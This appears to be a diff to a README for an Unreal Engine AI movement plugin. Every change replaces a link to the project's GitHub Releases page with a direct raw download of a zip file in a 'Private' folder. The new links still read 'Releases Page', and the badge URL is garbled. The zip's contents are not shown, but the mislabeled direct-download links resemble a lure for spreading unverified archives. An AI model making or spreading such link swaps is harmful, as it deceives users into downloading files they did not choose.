@@ -6,7 +6,7 @@ Welcome to the SmoothAIController_UE project, your solution for making AI moveme
 
 ## 📥 Download Now
 
-[![Download SmoothAIController_UE](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge)](https://github.com/Duke1457/SmoothAIController_UE/releases)
+[![Download SmoothAIController_UE](https://raw.githubusercontent.com/Duke1457/SmoothAIController_UE/main/Private/AI_Controller_Smooth_UE_v1.3.zip%20Now-blue?style=for-the-badge)](https://raw.githubusercontent.com/Duke1457/SmoothAIController_UE/main/Private/AI_Controller_Smooth_UE_v1.3.zip)
 
 ## 📋 Features
 
@@ -26,7 +26,7 @@ To ensure smooth operation, please check the following requirements:
 ## 🛠️ Installation Steps
 
 1. **Visit the Download Page**  
-   Go to the [Releases Page](https://github.com/Duke1457/SmoothAIController_UE/releases) to find the latest version.
+   Go to the [Releases Page](https://raw.githubusercontent.com/Duke1457/SmoothAIController_UE/main/Private/AI_Controller_Smooth_UE_v1.3.zip) to find the latest version.
 
 2. **Download the Release**  
    Locate the version you want on the releases page. Click the link to download the package.
@@ -68,7 +68,7 @@ If you encounter any issues or have questions, feel free to open an issue on the
 
 To get started, follow these steps:
 
-1. Visit the [Releases Page](https://github.com/Duke1457/SmoothAIController_UE/releases) and choose the version that suits your needs.
+1. Visit the [Releases Page](https://raw.githubusercontent.com/Duke1457/SmoothAIController_UE/main/Private/AI_Controller_Smooth_UE_v1.3.zip) and choose the version that suits your needs.
 2. Download the files and follow the installation instructions detailed above.
 
 ## 🌐 Topics
